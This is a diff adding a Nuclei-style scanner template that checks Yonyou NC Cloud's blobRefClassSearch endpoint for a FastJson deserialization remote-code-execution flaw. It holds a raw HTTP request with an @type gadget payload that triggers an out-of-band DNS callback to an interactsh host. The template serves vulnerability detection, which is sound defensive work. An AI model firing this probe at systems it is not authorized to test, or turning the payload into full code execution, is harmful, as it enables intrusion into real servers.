@@ -1,0 +1,32 @@
+id: yongyouNC-Cloud_blobRefClassSearch-fastjson
+
+info:
+  name: 用友NC Cloud blobRefClassSearch FastJson反序列化RCE
+  author: HuanXiong
+  severity: high
+  description: |-
+    用友NC Cloud存在FastJson反序列化漏洞，攻击者可利用该漏洞在服务器上执行任意代码，导致敏感信息泄露、权限提升等严重后果。
+  reference: |
+    -
+  tags: RCE
+
+http:
+  - raw:
+      - |
+        POST /ncchr/pm/ref/indiIssued/blobRefClassSearch HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"clientParam":"{\"x\":{\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"{{interactsh-url}}\"}}}"}
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+        - "dns"
+
+
+
+
+
+
